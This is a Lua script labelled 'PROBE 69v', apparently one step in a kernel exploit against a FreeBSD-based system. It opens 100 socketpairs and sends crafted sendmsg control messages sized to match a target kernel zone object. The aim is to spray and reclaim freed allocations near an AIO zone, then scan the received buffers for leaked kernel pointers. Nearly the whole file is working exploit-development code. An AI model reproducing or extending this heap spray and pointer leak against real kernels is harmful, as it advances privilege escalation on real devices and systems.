-- CRASH_CLASS: MODERATE
-- PROBE 69v: sendmsg control message spray for zone reclaim
--
-- Context: sendmsg with ancillary data (cmsg) causes kernel allocation
-- of mbuf/zone buffers for the control data. If we tune cmsg_len to
-- ~48 bytes, the allocation might match the R-object zone (0x1ab59e0).
-- After sending, recvmsg on the peer receives the data.
--
-- Plan: create socketpairs, send messages with controlled cmsg headers,
-- measure 624 delta, then check if the allocations interact with AIO zone.

print("=== PROBE 69v: SENDMSG CMSG SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local function read_624()
    local ret = nil
    pcall(function() ret = mk(624)() end)
    return ret and N(ret) or 0
end

-- ============================================================
-- [A] Create socketpairs for messaging
-- ============================================================
print("")
print("[A] Creating socketpairs")

local pairs_list = {}
for i = 1, 100 do
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
    end)
    local f0 = rd(N(sv)) or 0xFFFFFFFF
    local f1 = rd(N(sv) + 4) or 0xFFFFFFFF
    if f0 ~= 0xFFFFFFFF then
        table.insert(pairs_list, {f0, f1})
    end
end
print(string.format("  socketpairs: %d", #pairs_list))
if #pairs_list < 10 then print("FAIL: too few pairs"); return end

-- ============================================================
-- [B] sendmsg with varying cmsg sizes — measure 624 delta
-- ============================================================
print("")
print("[B] sendmsg with cmsg — 624 delta measurement")

-- FreeBSD msghdr (64-bit):
-- +0x00: msg_name (8B pointer)
-- +0x08: msg_namelen (4B) + pad (4B)
-- +0x10: msg_iov (8B pointer)
-- +0x18: msg_iovlen (4B) + pad (4B)
-- +0x20: msg_control (8B pointer)
-- +0x28: msg_controllen (4B) + pad (4B)
-- +0x30: msg_flags (4B)
-- Total: 0x34 bytes, padded to 0x38

-- cmsg header:
-- +0x00: cmsg_len (4B)
-- +0x04: cmsg_level (4B)
-- +0x08: cmsg_type (4B)
-- +0x0C: data...

local iov_data = memory.alloc(16)
wd(N(iov_data), 0x41414141)
wd(N(iov_data) + 4, 0x42424242)

local iov = memory.alloc(16)
wq(N(iov), uint64(N(iov_data)))      -- iov_base
wq(N(iov) + 8, uint64(8))             -- iov_len

-- Test different cmsg data sizes
local cmsg_sizes = {12, 16, 20, 24, 32, 36, 40, 44, 48, 56, 64, 80, 96, 128}

for _, cmsg_data_sz in ipairs(cmsg_sizes) do
    if not alive() then break end

    local cmsg_total = 12 + cmsg_data_sz  -- header (12) + data
    local cmsg = memory.alloc(cmsg_total + 8)

    -- Fill cmsg data with sentinel
    for j = 0, cmsg_total - 1, 4 do
        wd(N(cmsg) + j, 0xBEEF0000 + j)
    end
    -- cmsg header
    wd(N(cmsg), cmsg_total)        -- cmsg_len
    wd(N(cmsg) + 4, 0xFFFF)       -- cmsg_level = SOL_SOCKET
    wd(N(cmsg) + 8, 0x1234)       -- cmsg_type (arbitrary, kernel may reject)

    local msghdr = memory.alloc(0x40)
    wq(N(msghdr) + 0x00, uint64(0))             -- msg_name = NULL
    wd(N(msghdr) + 0x08, 0)                     -- msg_namelen = 0
    wq(N(msghdr) + 0x10, uint64(N(iov)))        -- msg_iov
    wd(N(msghdr) + 0x18, 1)                     -- msg_iovlen = 1
    wq(N(msghdr) + 0x20, uint64(N(cmsg)))       -- msg_control
    wd(N(msghdr) + 0x28, cmsg_total)             -- msg_controllen

    local c0 = read_624()
    local send_ret = nil
    pcall(function()
        send_ret = mk(28)(uint64(pairs_list[1][1]), uint64(N(msghdr)), uint64(0))
    end)
    local c1 = read_624()
    local sr = send_ret and sgn(send_ret) or -999

    -- Try to receive on the peer
    local recv_cmsg = memory.alloc(cmsg_total + 64)
    for j = 0, cmsg_total + 60, 4 do wd(N(recv_cmsg) + j, 0xCCCCCCCC) end

    local recv_iov_data = memory.alloc(16)
    local recv_iov = memory.alloc(16)
    wq(N(recv_iov), uint64(N(recv_iov_data)))
    wq(N(recv_iov) + 8, uint64(16))

    local recv_hdr = memory.alloc(0x40)
    wq(N(recv_hdr) + 0x00, uint64(0))
    wd(N(recv_hdr) + 0x08, 0)
    wq(N(recv_hdr) + 0x10, uint64(N(recv_iov)))
    wd(N(recv_hdr) + 0x18, 1)
    wq(N(recv_hdr) + 0x20, uint64(N(recv_cmsg)))
    wd(N(recv_hdr) + 0x28, cmsg_total + 64)

    local recv_ret = nil
    pcall(function()
        recv_ret = mk(27)(uint64(pairs_list[1][2]), uint64(N(recv_hdr)), uint64(0))
    end)
    local rr = recv_ret and sgn(recv_ret) or -999

    -- Check received cmsg
    local recv_controllen = rd(N(recv_hdr) + 0x28) or 0
    local recv_cmsg_len = rd(N(recv_cmsg)) or 0

    -- Scan for kernel pointers in received cmsg
    local kptrs = 0
    for j = 0, cmsg_total + 60, 4 do
        local v = rd(N(recv_cmsg) + j) or 0xCCCCCCCC
        if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
            kptrs = kptrs + 1
        end
    end

    local tag = ""
    if sr > 0 and recv_controllen > 0 then tag = " CMSG_DELIVERED" end
    if kptrs > 0 then tag = tag .. " *** KPTR ***" end

    print(string.format("  cmsg_data=%dB: send=%d recv=%d 624_delta=%d controllen=%d cmsg_len=%d kptrs=%d%s",
        cmsg_data_sz, sr, rr, c1 - c0, recv_controllen, recv_cmsg_len, kptrs, tag))

    -- Drain the received message before next iteration
end

if not alive() then print("DEAD after cmsg sweep"); return end

-- ============================================================
-- [C] Bulk sendmsg spray — many messages, then check AIO overlap
-- ============================================================
print("")
print("[C] Bulk sendmsg spray (48B cmsg data)")

-- Use cmsg_data = 36 bytes (48B total with header = 12+36)
-- This is close to R-object size
local bulk_cmsg_total = 48
local bulk_cmsg = memory.alloc(bulk_cmsg_total + 8)
wd(N(bulk_cmsg), bulk_cmsg_total)    -- cmsg_len
wd(N(bulk_cmsg) + 4, 0xFFFF)        -- SOL_SOCKET
wd(N(bulk_cmsg) + 8, 0x7777)        -- arbitrary type
for j = 12, bulk_cmsg_total - 1, 4 do
    wd(N(bulk_cmsg) + j, 0xABCD0000 + j)
end

local bulk_msghdr = memory.alloc(0x40)
wq(N(bulk_msghdr) + 0x00, uint64(0))
wd(N(bulk_msghdr) + 0x08, 0)
wq(N(bulk_msghdr) + 0x10, uint64(N(iov)))
wd(N(bulk_msghdr) + 0x18, 1)
wq(N(bulk_msghdr) + 0x20, uint64(N(bulk_cmsg)))
wd(N(bulk_msghdr) + 0x28, bulk_cmsg_total)

local c0 = read_624()
local sent = 0
for i = 1, math.min(50, #pairs_list) do
    if not alive() then break end
    local ret = nil
    pcall(function()
        ret = mk(28)(uint64(pairs_list[i][1]), uint64(N(bulk_msghdr)), uint64(0))
    end)
    if ret and sgn(ret) > 0 then sent = sent + 1 end
end
local c1 = read_624()
print(string.format("  sent %d/%d messages, 624_delta=%d", sent, 50, c1 - c0))

-- Receive all messages and check for kernel pointer contamination
local recv_kptrs = 0
for i = 1, math.min(50, #pairs_list) do
    if not alive() then break end

    local rc = memory.alloc(0x100)
    for j = 0, 0xFC, 4 do wd(N(rc) + j, 0xCCCCCCCC) end

    local rd_buf = memory.alloc(16)
    local rd_iov = memory.alloc(16)
    wq(N(rd_iov), uint64(N(rd_buf)))
    wq(N(rd_iov) + 8, uint64(16))

    local rh = memory.alloc(0x40)
    wq(N(rh) + 0x00, uint64(0))
    wd(N(rh) + 0x08, 0)
    wq(N(rh) + 0x10, uint64(N(rd_iov)))
    wd(N(rh) + 0x18, 1)
    wq(N(rh) + 0x20, uint64(N(rc)))
    wd(N(rh) + 0x28, 0x100)

    pcall(function()
        mk(27)(uint64(pairs_list[i][2]), uint64(N(rh)), uint64(0))
    end)

    local got_controllen = rd(N(rh) + 0x28) or 0
    for j = 0, math.min(got_controllen, 0xFC), 4 do
        local v = rd(N(rc) + j) or 0xCCCCCCCC
        if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
            recv_kptrs = recv_kptrs + 1
            if recv_kptrs <= 5 then
                print(string.format("    KPTR in recv cmsg[%d] +0x%02X: 0x%08X", i, j, v))
            end
        end
    end
end
print(string.format("  recv kernel pointers: %d", recv_kptrs))

if not alive() then print("DEAD"); return end

-- ============================================================
-- [D] Cleanup
-- ============================================================
print("")
print("[D] Cleanup")
for _, p in ipairs(pairs_list) do
    pcall(function() mk(6)(uint64(p[1])) end)
    pcall(function() mk(6)(uint64(p[2])) end)
end
print("  closed all socketpairs")
print("  alive=" .. (alive() and "YES" or "NO"))

print("")
print("=== PROBE 69v COMPLETE ===")
